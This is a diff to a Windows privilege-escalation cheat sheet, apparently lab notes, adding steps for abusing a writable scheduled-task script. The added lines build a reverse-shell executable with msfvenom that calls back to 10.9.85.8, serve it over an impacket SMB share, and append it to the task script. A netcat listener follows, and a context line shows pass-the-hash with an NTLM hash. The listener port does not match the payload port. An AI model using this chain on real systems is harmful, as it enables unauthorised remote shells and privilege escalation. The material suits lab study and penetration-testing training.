@@ -316,13 +316,22 @@ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd
 
 
 ## CATEGORY "SCHEDULED TASKS" - INSECURE PERMISSIONS 
+### Scenario 1
 ```
 type C:\DevTools\CleanUp.ps1
 C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.85.8 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\10.9.85.8\kali\reverse.exe C:\PrivEsc\reverse.exe
+
 echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 nc -lvp 123
 ```
-
+### Scenario 2
+```
+schtasks /query /fo LIST /v
+```
 
 ________________________________________________
 CATEGORY : INSECURE GUI APPS
